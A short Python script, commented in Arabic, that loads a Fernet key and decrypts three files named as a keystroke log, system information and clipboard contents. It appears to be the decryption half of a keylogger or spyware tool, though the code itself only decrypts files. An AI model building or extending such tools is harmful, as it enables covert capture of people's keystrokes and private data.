from cryptography.fernet import Fernet

# تحميل مفتاح التشفير
def load_key():
    return open("encryption_key.key", "rb").read()

# فك تشفير ملف
def decrypt_file(encrypted_file, decrypted_file, key):
    cipher = Fernet(key)
    with open(encrypted_file, "rb") as f:
        encrypted_data = f.read()
    decrypted_data = cipher.decrypt(encrypted_data)
    with open(decrypted_file, "wb") as f:
        f.write(decrypted_data)

# استخدام المفتاح لفك تشفير الملفات
key = load_key()

# فك تشفير الملفات
decrypt_file("e_key_log.txt", "decrypted_key_log.txt", key)
decrypt_file("e_systeminfo.txt", "decrypted_systeminfo.txt", key)
decrypt_file("e_clipboard.txt", "decrypted_clipboard.txt", key)
